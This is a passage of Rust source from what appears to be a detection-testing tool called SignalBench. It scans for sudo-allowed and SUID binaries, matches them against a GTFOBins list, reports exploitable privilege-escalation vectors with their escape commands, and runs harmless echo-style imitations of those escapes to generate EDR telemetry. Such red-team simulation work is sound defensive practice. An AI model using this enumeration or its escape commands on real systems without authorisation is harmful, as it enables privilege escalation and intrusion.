                                if !binary_name.is_empty() {
                                    debug!("[T1548-GTFOBINS] Found SUID binary: {}", line);
                                    suid_binaries.push(binary_name);
                                }
                            }
                        }
                        Err(e) => {
                            debug!("[T1548-GTFOBINS] find in {} failed: {}", base_path, e);
                        }
                    }
                }

                info!(
                    "[T1548-GTFOBINS] Found {} SUID binaries",
                    suid_binaries.len()
                );
            }

            // Step 4: Cross-reference and build exploitable list
            info!("[T1548-GTFOBINS] Step 4: Cross-referencing against GTFOBins database");

            for entry in &gtfobins_db {
                let has_binary = binary_paths.contains_key(entry.binary);
                let sudo_allowed = sudo_entries.contains_key(entry.binary);
                let suid_set = suid_binaries.contains(&entry.binary.to_string());

                if has_binary && (sudo_allowed || suid_set) {
                    let binary_path = binary_paths.get(entry.binary).cloned().unwrap_or_default();

                    debug!(
                        "[T1548-GTFOBINS] EXPLOITABLE: {} (sudo={}, suid={})",
                        entry.binary, sudo_allowed, suid_set
                    );
                    debug!("[T1548-GTFOBINS]   Method: {}", entry.escape_method);
                    debug!("[T1548-GTFOBINS]   Command: {}", entry.shell_command);

                    exploitable.push(ExploitableBinary {
                        binary_path,
                        binary_name: entry.binary.to_string(),
                        sudo_allowed,
                        suid_set,
                        escape_method: entry.escape_method.to_string(),
                        shell_command: entry.shell_command.to_string(),
                        category: entry.category.to_string(),
                    });
                }
            }

            // Step 5: Generate telemetry by running GTFOBins exploitation commands
            if generate_telemetry && !exploitable.is_empty() {
                info!("[T1548-GTFOBINS] Step 5: Generating telemetry with GTFOBins exploitation attempts");

                for exp in &exploitable {
                    debug!(
                        "[T1548-GTFOBINS] Attempting exploitation pattern for: {}",
                        exp.binary_name
                    );

                    // First run safe --version to establish baseline telemetry
                    let _ = Command::new(&exp.binary_path)
                        .arg("--version")
                        .output()
                        .await;

                    // Attempt actual GTFOBins exploitation commands (safely exit after)
                    // These generate high-value telemetry for EDR detection
                    match exp.binary_name.as_str() {
                        "vim" | "vi" => {
                            let _ = Command::new(&exp.binary_path)
                                .args(["-c", ":!echo signalbench_privesc_test", "-c", ":q!"])
                                .output()
                                .await;
                        }
                        "python" | "python3" => {
                            let _ = Command::new(&exp.binary_path)
                                .args(["-c", "import os; print('signalbench_privesc_test')"])
                                .output()
                                .await;
                        }
                        "perl" => {
                            let _ = Command::new(&exp.binary_path)
                                .args(["-e", "print 'signalbench_privesc_test\\n'"])
                                .output()
                                .await;
                        }
                        "awk" | "gawk" => {
                            let _ = Command::new(&exp.binary_path)
                                .args(["BEGIN {print \"signalbench_privesc_test\"}"])
                                .output()
                                .await;
                        }
                        "find" => {
                            let _ = Command::new(&exp.binary_path)
                                .args([
                                    "/tmp",
                                    "-name",
                                    "signalbench*",
                                    "-exec",
                                    "echo",
                                    "privesc_test",
                                    ";",
                                ])
                                .output()
                                .await;
                        }
                        "less" => {
                            let _ = Command::new(&exp.binary_path)
                                .args(["--version"])
                                .output()
                                .await;
                        }
                        "nmap" => {
                            let _ = Command::new(&exp.binary_path)
                                .args(["--script-help=*"])
                                .output()
                                .await;
                        }
                        _ => {
                            // Default: run with --help for other binaries
                            let _ = Command::new(&exp.binary_path).arg("--help").output().await;
                        }
                    }
                }

                info!(
                    "[T1548-GTFOBINS] Generated exploitation telemetry for {} binaries",
                    exploitable.len()
                );
            }

            // Build result message
            let mut result_lines = Vec::new();
            result_lines.push("GTFOBins Privilege Escalation Probe Results:".to_string());
            result_lines.push(format!(
                "  [INFO] Scanned {} GTFOBins binaries",
                gtfobins_db.len()
            ));
            result_lines.push(format!(
                "  [INFO] Found {} binaries installed on system",
                binaries_found
            ));
            result_lines.push(format!(
                "  [INFO] Found {} sudo-allowed binaries",
                sudo_entries.len()
            ));
            result_lines.push(format!(
                "  [INFO] Found {} SUID binaries",
                suid_binaries.len()
            ));
            result_lines.push(String::new());

            if exploitable.is_empty() {
                result_lines.push(
                    "  [OK] No exploitable GTFOBins privilege escalation vectors found".to_string(),
                );
            } else {
                result_lines.push(format!(
                    "  [WARN] Found {} EXPLOITABLE privilege escalation vectors:",
                    exploitable.len()
                ));
                result_lines.push(String::new());

                for exp in &exploitable {
                    let access_type = if exp.sudo_allowed && exp.suid_set {
                        "SUDO+SUID"
                    } else if exp.sudo_allowed {
                        "SUDO"
                    } else {
                        "SUID"
                    };

                    result_lines.push(format!(
                        "  [{}] {} ({})",
                        access_type, exp.binary_name, exp.binary_path
                    ));
                    result_lines.push(format!("      Method: {}", exp.escape_method));
                    result_lines.push(format!("      Escape: {}", exp.shell_command));
                }
            }

            let result_message = result_lines.join("\n");
            info!("{}", result_message);

            // Create artefact file with findings
            let artefact_path = "/tmp/signalbench_gtfobins_probe.txt";
            if let Ok(mut file) = std::fs::File::create(artefact_path) {
                use std::io::Write;
                let _ = writeln!(file, "SignalBench GTFOBins Probe Results");
                let _ = writeln!(file, "Generated: {}", chrono::Local::now());
                let _ = writeln!(file);
                let _ = writeln!(file, "{}", result_message);
            }

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: result_message,
                artifacts: vec![artefact_path.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1548-GTFOBINS] Starting cleanup");

            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match std::fs::remove_file(artifact) {
                        Ok(_) => {
                            debug!("[T1548-GTFOBINS] Removed artefact: {}", artifact);
                            info!("[OK] Removed: {}", artifact);
                        }
                        Err(e) => {
                            warn!("[T1548-GTFOBINS] Failed to remove {}: {}", artifact, e);
                        }
                    }
                }
            }

            debug!("[T1548-GTFOBINS] Cleanup complete");
            Ok(())
        })
    }
}
